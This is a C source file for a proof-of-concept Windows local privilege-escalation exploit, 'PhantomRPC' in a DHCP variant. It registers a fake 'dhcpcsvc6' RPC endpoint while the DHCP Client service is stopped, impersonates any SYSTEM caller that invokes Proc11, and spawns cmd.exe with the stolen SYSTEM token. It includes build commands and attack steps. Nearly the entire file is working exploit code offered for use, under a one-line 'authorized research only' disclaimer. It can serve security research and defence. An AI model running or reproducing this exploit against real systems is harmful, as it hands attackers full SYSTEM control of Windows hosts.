/*
 * PhantomRPC POC — DHCP (dhcpcsvc6) variant
 *
 * Attack scenario: DHCP Client service coercion
 * ─────────────────────────────────────────────────────────────────────────────
 * Prerequisites:
 *   1. Attacker has SeImpersonatePrivilege.
 *   2. DHCP Client service (Dhcp) is stopped or disabled.
 *
 * Steps:
 *   1. Compile this server (see BUILD section below).
 *   2. Run it from an account with SeImpersonatePrivilege.
 *   3. Any SYSTEM-level caller that invokes Proc11 on endpoint "dhcpcsvc6"
 *      triggers RpcImpersonateClient() and spawns a SYSTEM cmd.exe.
 *
 * BUILD:
 *   midl ExampleInterface.idl /app_config
 *   cl.exe server.c ExampleInterface_s.c ^
 *       /link rpcrt4.lib advapi32.lib userenv.lib wtsapi32.lib
 *
 * Source: Kaspersky klsecservices/PhantomRPC (MIT), Black Hat Asia 2026.
 * ─────────────────────────────────────────────────────────────────────────────
 * FOR AUTHORIZED SECURITY RESEARCH ONLY.
 */

#include <windows.h>
#include <stdio.h>
#include <stdarg.h>
#include <stdlib.h>
#include <rpc.h>
#include <userenv.h>
#include <wtsapi32.h>
#include "ExampleInterface.h"

#pragma comment(lib, "rpcrt4.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "userenv.lib")
#pragma comment(lib, "wtsapi32.lib")

/* ── Logging ─────────────────────────────────────────────────────────────── */

#define LOG_FILE "C:\\Windows\\Temp\\PhantomRPC_DHCP.log"

static void LogMessage(const char *fmt, ...) {
    FILE *fp = fopen(LOG_FILE, "a");
    if (!fp) return;
    va_list args;
    va_start(args, fmt);
    vfprintf(fp, fmt, args);
    va_end(args);
    fprintf(fp, "\n");
    fflush(fp);
    fclose(fp);
}

/* ── Token helpers ───────────────────────────────────────────────────────── */

static BOOL IsSystemToken(HANDLE hToken) {
    DWORD cb = 0;
    PTOKEN_USER pUser = NULL;
    BYTE  sysSidBuf[SECURITY_MAX_SID_SIZE];
    DWORD sysSidSize = sizeof(sysSidBuf);
    BOOL  result = FALSE;

    GetTokenInformation(hToken, TokenUser, NULL, 0, &cb);
    pUser = (PTOKEN_USER)LocalAlloc(LPTR, cb);
    if (!pUser) return FALSE;

    if (GetTokenInformation(hToken, TokenUser, pUser, cb, &cb)) {
        if (CreateWellKnownSid(WinLocalSystemSid, NULL, sysSidBuf, &sysSidSize))
            result = EqualSid(pUser->User.Sid, (PSID)sysSidBuf);
    }
    LocalFree(pUser);
    return result;
}

static void SpawnCmdWithSystemToken(HANDLE hImpersonationToken) {
    HANDLE hPrimary = NULL;
    DWORD  dwSession = WTSGetActiveConsoleSessionId();
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {0};
    LPVOID lpEnv = NULL;

    LogMessage("[*] SpawnCmdWithSystemToken: enter");

    if (!DuplicateTokenEx(hImpersonationToken, TOKEN_ALL_ACCESS, NULL,
                          SecurityImpersonation, TokenPrimary, &hPrimary)) {
        LogMessage("[-] DuplicateTokenEx failed: %lu", GetLastError());
        return;
    }

    if (IsSystemToken(hImpersonationToken)) {
        if (!SetTokenInformation(hPrimary, TokenSessionId,
                                 &dwSession, sizeof(DWORD))) {
            LogMessage("[-] SetTokenInformation failed: %lu", GetLastError());
            CloseHandle(hPrimary);
            return;
        }
        LogMessage("[+] Token redirected to console session %lu", (unsigned long)dwSession);
    }

    if (!CreateEnvironmentBlock(&lpEnv, hPrimary, TRUE)) {
        LogMessage("[-] CreateEnvironmentBlock failed: %lu", GetLastError());
        CloseHandle(hPrimary);
        return;
    }

    if (!CreateProcessAsUserW(hPrimary,
                              L"C:\\Windows\\System32\\cmd.exe",
                              NULL, NULL, NULL, FALSE,
                              CREATE_UNICODE_ENVIRONMENT | CREATE_NEW_CONSOLE,
                              lpEnv, NULL, &si, &pi)) {
        LogMessage("[-] CreateProcessAsUserW failed: %lu", GetLastError());
    } else {
        LogMessage("[+] cmd.exe spawned as SYSTEM (PID %lu)", (unsigned long)pi.dwProcessId);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    DestroyEnvironmentBlock(lpEnv);
    CloseHandle(hPrimary);
}

static void ImpersonateAndRunCmd(void) {
    HANDLE hToken = NULL;

    LogMessage("[*] ImpersonateAndRunCmd: enter");

    if (RpcImpersonateClient(NULL) != RPC_S_OK) {
        LogMessage("[-] RpcImpersonateClient failed: %lu", GetLastError());
        return;
    }
    LogMessage("[+] RpcImpersonateClient succeeded");

    if (!OpenThreadToken(GetCurrentThread(),
                         TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY,
                         FALSE, &hToken)) {
        LogMessage("[-] OpenThreadToken failed: %lu", GetLastError());
        RpcRevertToSelf();
        return;
    }

    SpawnCmdWithSystemToken(hToken);
    CloseHandle(hToken);
    RpcRevertToSelf();

    LogMessage("[*] ImpersonateAndRunCmd: exit");
}

/* ── RPC procedure stubs ─────────────────────────────────────────────────── */

long Proc0(void)  { return RPC_S_OK; }
long Proc1(void)  { return RPC_S_OK; }
long Proc2(void)  { return RPC_S_OK; }
long Proc3(void)  { return RPC_S_OK; }
long Proc4(void)  { return RPC_S_OK; }
long Proc5(void)  { return RPC_S_OK; }
long Proc6(void)  { return RPC_S_OK; }
long Proc7(void)  { return RPC_S_OK; }
long Proc8(void)  { return RPC_S_OK; }
long Proc9(void)  { return RPC_S_OK; }
long Proc10(void) { return RPC_S_OK; }

/*
 * Proc11 — the impersonation trigger for the DHCP scenario.
 * Called by a SYSTEM-level process targeting the DHCP Client interface.
 */
long Proc11(wchar_t *arg_0, struct Struct_690_t *arg_1) {
    LogMessage("[*] Proc11 called (arg_0=%ls) — SYSTEM client detected",
               arg_0 ? arg_0 : L"<null>");
    ImpersonateAndRunCmd();
    return RPC_S_OK;
}

long Proc12(void) { return RPC_S_OK; }
long Proc13(void) { return RPC_S_OK; }

/* ── Entry point ─────────────────────────────────────────────────────────── */

int main(void) {
    RPC_STATUS status;

    LogMessage("=== PhantomRPC DHCP POC starting ===");
    LogMessage("[*] Registering fake dhcpcsvc6 endpoint (ncalrpc)");

    status = RpcServerUseProtseqEpW(
        (RPC_WSTR)L"ncalrpc",
        RPC_C_PROTSEQ_MAX_REQS_DEFAULT,
        (RPC_WSTR)L"dhcpcsvc6",
        NULL);
    if (status) {
        LogMessage("[-] RpcServerUseProtseqEpW failed: 0x%lx", status);
        return (int)status;
    }
    LogMessage("[+] Endpoint 'dhcpcsvc6' registered");

    status = RpcServerRegisterIf2(
        ExampleInterface_v1_0_s_ifspec,
        NULL, NULL,
        0,
        RPC_C_LISTEN_MAX_CALLS_DEFAULT,
        (unsigned)-1,
        NULL);
    if (status) {
        LogMessage("[-] RpcServerRegisterIf2 failed: 0x%lx", status);
        return (int)status;
    }
    LogMessage("[+] Interface registered (UUID 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d6 v1.0)");

    status = RpcServerRegisterAuthInfoW(NULL, RPC_C_AUTHN_WINNT, NULL, NULL);
    if (status) {
        LogMessage("[-] RpcServerRegisterAuthInfoW failed: 0x%lx", status);
        return (int)status;
    }
    LogMessage("[+] NTLM auth info registered");
    LogMessage("[*] Listening — stop Dhcp service, then trigger a DHCP operation");

    status = RpcServerListen(1, RPC_C_LISTEN_MAX_CALLS_DEFAULT, FALSE);
    if (status) {
        LogMessage("[-] RpcServerListen failed: 0x%lx", status);
        return (int)status;
    }

    return 0;
}

/* ── MIDL memory helpers ─────────────────────────────────────────────────── */

void *__RPC_USER midl_user_allocate(size_t size) { return malloc(size); }
void  __RPC_USER midl_user_free(void *ptr)        { free(ptr); }
